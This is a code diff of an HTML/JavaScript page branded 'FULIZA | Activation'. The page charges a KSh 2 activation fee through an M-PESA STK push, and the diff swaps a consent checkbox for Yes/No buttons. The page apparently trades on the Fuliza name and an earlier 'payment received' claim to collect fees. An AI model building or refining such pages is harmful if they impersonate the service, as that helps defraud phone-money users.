@@ -6,7 +6,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>FULIZA - Activation</title>
+<title>FULIZA | Activation</title>
 
 <style>
 
@@ -167,40 +167,10 @@ p{
     text-align:center;
 }
 
-.consent{
-    margin-top:16px;
-
-    background:#000000;
-
-    border:1px solid #FFFFFF;
-    border-radius:10px;
-
-    padding:13px;
-
-    display:flex;
-    align-items:flex-start;
-
-    gap:10px;
-}
-
-.consent input{
-    width:20px;
-    height:20px;
-    margin:0;
-
-    flex-shrink:0;
-}
-
-.consent label{
-    color:#FFFFFF;
-    font-size:13px;
-    line-height:1.5;
-}
-
 button{
     width:100%;
     padding:15px;
-    margin-top:18px;
+    margin-top:10px;
 
     background:#000000;
     color:#FFFFFF;
@@ -227,6 +197,10 @@ button:disabled{
 
     cursor:not-allowed;
     box-shadow:none;
+}
+
+#noBtn{
+    background:rgba(0,0,0,0.35);
 }
 
 #message{
@@ -287,7 +261,7 @@ button:disabled{
 </div>
 
 <h1>
-    Complete Activation
+    Activation
 </h1>
 
 <p>
@@ -298,19 +272,13 @@ button:disabled{
 </p>
 
 <p>
-    Your previous payment has been successfully
-    confirmed.
+    Your previous payment has been
+    successfully received.
 </p>
 
 <div class="amount">
     Activation Fee: KSh 2
 </div>
-
-<p>
-    To continue with activation, review the
-    activation fee and choose whether you want
-    to proceed.
-</p>
 
 <div class="info">
 
@@ -342,34 +310,25 @@ button:disabled{
 
 <div class="notice">
 
-    If you choose to continue, an M-PESA STK
-    prompt for KSh 2 will be sent to the number
-    shown above. Review the amount before
-    confirming the payment on your phone.
-
-</div>
-
-<div class="consent">
-
-    <input
-        type="checkbox"
-        id="consent"
-    >
-
-    <label for="consent">
-        I understand that the activation fee is
-        KSh 2 and I want to proceed with the
-        payment.
-    </label>
+    Are you ready to pay the KSh 2 activation
+    fee? Choose an option below.
 
 </div>
 
 <button
     type="button"
-    id="payBtn"
+    id="yesBtn"
     onclick="payActivation()"
 >
-    Pay KSh 2 Activation Fee
+    Yes, I'm Ready to Pay
+</button>
+
+<button
+    type="button"
+    id="noBtn"
+    onclick="cancelActivation()"
+>
+    No, Not Now
 </button>
 
 <p id="message"></p>
@@ -386,7 +345,7 @@ button:disabled{
 <script>
 
 /* =====================================================
-   FULIZA BACKEND
+   EXISTING FULIZA BACKEND
 ===================================================== */
 
 const BACKEND_URL =
@@ -401,7 +360,7 @@ const ACTIVATION_FEE = 2;
 
 
 /* =====================================================
-   CUSTOMER DATA
+   CUSTOMER DETAILS
 ===================================================== */
 
 const savedName =
@@ -481,7 +440,7 @@ function normalizePhone(phone){
    DISPLAY PHONE
 ===================================================== */
 
-const normalizedSavedPhone =
+const phone =
     normalizePhone(
         savedPhone
     );
@@ -490,15 +449,15 @@ const normalizedSavedPhone =
 document.getElementById(
     "phone"
 ).textContent =
-    normalizedSavedPhone ||
+    phone ||
     "Not available";
 
 
 /* =====================================================
-   CREATE REFERENCE
+   CREATE ACTIVATION REFERENCE
 ===================================================== */
 
-function createReference(){
+function createActivationReference(){
 
     return (
         "ACT-" +
@@ -511,14 +470,44 @@ function createReference(){
 
 
 /* =====================================================
-   PAY ACTIVATION
+   CUSTOMER SELECTS NO
+===================================================== */
+
+function cancelActivation(){
+
+    const message =
+        document.getElementById(
+            "message"
+        );
+
+
+    localStorage.setItem(
+        "fulizaaActivationDecision",
+        "NO"
+    );
+
+
+    message.textContent =
+        "Activation payment has not been started.";
+
+}
+
+
+/* =====================================================
+   CUSTOMER SELECTS YES
 ===================================================== */
 
 async function payActivation(){
 
     const btn =
         document.getElementById(
-            "payBtn"
+            "yesBtn"
+        );
+
+
+    const noBtn =
+        document.getElementById(
+            "noBtn"
         );
 
 
@@ -528,35 +517,9 @@ async function payActivation(){
         );
 
 
-    const consent =
-        document.getElementById(
-            "consent"
-        );
-
-
     /* -----------------------------------------
-       CUSTOMER CONSENT
+       VALIDATE M-PESA NUMBER
     ----------------------------------------- */
-
-    if(!consent.checked){
-
-        message.textContent =
-            "Please confirm that you want to proceed with the KSh 2 activation fee.";
-
-        return;
-
-    }
-
-
-    /* -----------------------------------------
-       PHONE VALIDATION
-    ----------------------------------------- */
-
-    const phone =
-        normalizePhone(
-            savedPhone
-        );
-
 
     if(
         !/^254\d{9}$/.test(phone)
@@ -571,16 +534,22 @@ async function payActivation(){
 
 
     /* -----------------------------------------
+       CUSTOMER AGREED
+    ----------------------------------------- */
+
+    localStorage.setItem(
+        "fulizaaActivationDecision",
+        "YES"
+    );
+
+
+    /* -----------------------------------------
        CREATE REFERENCE
     ----------------------------------------- */
 
     const reference =
-        createReference();
+        createActivationReference();
 
-
-    /* -----------------------------------------
-       SAVE ACTIVATION DATA
-    ----------------------------------------- */
 
     localStorage.setItem(
         "fulizaaActivationReference",
@@ -594,17 +563,13 @@ async function payActivation(){
     );
 
 
-    localStorage.setItem(
-        "fulizaaActivationStatus",
-        "SENT"
-    );
-
-
     /* -----------------------------------------
-       DISABLE BUTTON
+       DISABLE BUTTONS
     ----------------------------------------- */
 
     btn.disabled = true;
+
+    noBtn.disabled = true;
 
     btn.textContent =
         "Sending STK Push...";
@@ -615,7 +580,7 @@ async function payActivation(){
 
 
     /* -----------------------------------------
-       SEND TO EXISTING PAYLOR ENDPOINT
+       CALL EXISTING STK ENDPOINT
     ----------------------------------------- */
 
     try{
@@ -663,6 +628,10 @@ async function payActivation(){
                 }
             );
 
+
+        /* -----------------------------------------
+           READ RESPONSE
+        ----------------------------------------- */
 
         const responseText =
             await response.text();
@@ -712,7 +681,7 @@ async function payActivation(){
 
                 data.message ||
                 data.error ||
-                "Activation payment request failed."
+                "Unable to send activation STK Push."
 
             );
 
@@ -720,7 +689,7 @@ async function payActivation(){
 
 
         /* -----------------------------------------
-           SAVE TRANSACTION ID
+           SAVE TRANSACTION
         ----------------------------------------- */
 
         if(
@@ -747,6 +716,12 @@ async function payActivation(){
         }
 
 
+        localStorage.setItem(
+            "fulizaaActivationStatus",
+            "SENT"
+        );
+
+
         /* -----------------------------------------
            STK SENT
         ----------------------------------------- */
@@ -756,11 +731,11 @@ async function payActivation(){
 
 
         message.textContent =
-            "M-PESA STK prompt sent. Enter your PIN to complete the KSh 2 activation fee.";
+            "STK Push sent successfully. Check your M-PESA phone and enter your PIN.";
 
 
         /* -----------------------------------------
-           START STATUS CHECK
+           CHECK PAYMENT
         ----------------------------------------- */
 
         if(
@@ -773,13 +748,9 @@ async function payActivation(){
 
         }else{
 
-            message.textContent =
-                "STK Push was sent, but no transaction ID was returned.";
-
-            btn.disabled = false;
-
-            btn.textContent =
-                "Pay KSh 2 Activation Fee";
+            throw new Error(
+                "No transaction ID was returned."
+            );
 
         }
 
@@ -787,7 +758,7 @@ async function payActivation(){
     }catch(error){
 
         console.error(
-            "ACTIVATION PAYMENT ERROR:",
+            "ACTIVATION STK ERROR:",
             error
         );
 
@@ -800,15 +771,19 @@ async function payActivation(){
 
         message.textContent =
             error.message ||
-            "Unable to send activation payment request.";
+            "Activation payment request failed.";
 
 
         btn.disabled =
             false;
 
 
+        noBtn.disabled =
+            false;
+
+
         btn.textContent =
-            "Pay KSh 2 Activation Fee";
+            "Yes, I'm Ready to Pay";
 
     }
 
@@ -825,7 +800,13 @@ function checkActivationPayment(
 
     const btn =
         document.getElementById(
-            "payBtn"
+            "yesBtn"
+        );
+
+
+    const noBtn =
+        document.getElementById(
+            "noBtn"
         );
 
 
@@ -886,7 +867,7 @@ function checkActivationPayment(
 
 
                     console.log(
-                        "ACTIVATION PAYMENT STATUS:",
+                        "ACTIVATION STATUS:",
                         data
                     );
 
@@ -898,7 +879,7 @@ function checkActivationPayment(
 
 
                     /* ---------------------------------
-                       COMPLETED
+                       PAYMENT COMPLETED
                     --------------------------------- */
 
                     if(
@@ -933,14 +914,18 @@ function checkActivationPayment(
                             "Activation Successful";
 
 
+                        noBtn.disabled =
+                            true;
+
+
                         message.textContent =
                             "Congratulations! Your KSh 2 activation fee has been received successfully.";
 
 
                         /*
-                           Continue only after the backend
-                           confirms COMPLETED.
-                        */
+                         * Change this page name to whatever
+                         * your next page is called.
+                         */
 
                         setTimeout(
                             function(){
@@ -960,7 +945,7 @@ function checkActivationPayment(
 
 
                     /* ---------------------------------
-                       FAILED
+                       PAYMENT FAILED
                     --------------------------------- */
 
                     if(
@@ -987,8 +972,12 @@ function checkActivationPayment(
                             false;
 
 
+                        noBtn.disabled =
+                            false;
+
+
                         btn.textContent =
-                            "Pay KSh 2 Activation Fee";
+                            "Yes, I'm Ready to Pay";
 
 
                         return;
@@ -1011,15 +1000,19 @@ function checkActivationPayment(
 
 
                         message.textContent =
-                            "Payment confirmation is taking longer than expected. Please check your M-PESA transaction status before trying again.";
+                            "Payment confirmation is taking longer than expected. Please check your payment status before trying again.";
 
 
                         btn.disabled =
                             false;
 
 
+                        noBtn.disabled =
+                            false;
+
+
                         btn.textContent =
-                            "Pay KSh 2 Activation Fee";
+                            "Yes, I'm Ready to Pay";
 
                     }
 
@@ -1031,6 +1024,12 @@ function checkActivationPayment(
                         error
                     );
 
+
+                    /*
+                     * Temporary status-request errors
+                     * do not immediately mark payment
+                     * as failed.
+                     */
 
                     if(
                         attempts >=
@@ -1050,8 +1049,12 @@ function checkActivationPayment(
                             false;
 
 
+                        noBtn.disabled =
+                            false;
+
+
                         btn.textContent =
-                            "Pay KSh 2 Activation Fee";
+                            "Yes, I'm Ready to Pay";
 
                     }
 
